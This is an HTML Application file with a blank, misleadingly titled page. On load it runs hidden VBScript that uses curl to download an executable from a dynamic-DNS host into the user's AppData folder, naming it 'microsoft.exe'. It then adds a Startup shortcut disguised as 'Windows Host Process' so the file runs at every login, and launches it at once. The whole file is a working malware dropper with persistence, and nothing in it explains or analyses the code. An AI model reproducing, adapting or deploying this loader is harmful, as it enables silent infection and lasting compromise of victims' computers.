<html>
<head>
    <title>you</title>
    <HTA:APPLICATION 
        ID="DownloadApp" 
        APPLICATIONNAME="DownloadFile" 
        BORDER="none" 
        BORDERSTYLE="none" 
        CAPTION="no" 
        SHOWINTASKBAR="no" 
        WINDOWSTATE="hidden" 
        SCROLL="no" 
        SINGLEINSTANCE="yes" />
    <script language="VBScript">
        Sub X
            Dim A1, B1, C1, D1, E1, F1, G1, H1, I1, J1, K1, L1

            C1 = "http://tinseltesting.ddns.net/katrina/htdocs"
            F1 = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%")
            D1 = F1 & "\microsoft.exe"

            B1 = "curl -L " & Chr(34) & C1 & Chr(34) & " -o " & Chr(34) & D1 & Chr(34)

            Set A1 = CreateObject("WScript.Shell")

            A1.Run B1, 0, True

            I1 = A1.SpecialFolders("Startup")

            J1 = I1 & "\Windows Host Process.lnk"

            Set K1 = CreateObject("WScript.Shell")

            Set L1 = K1.CreateShortcut(J1)
            L1.TargetPath = D1
            L1.WorkingDirectory = F1
            L1.WindowStyle = 1
            L1.Save

            E1 = Chr(34) & D1 & Chr(34)
            A1.Run E1, 1, False

            Set A1 = Nothing
            Set K1 = Nothing

            window.close
        End Sub
    </script>
</head>
<body onload="X">
</body>
</html>
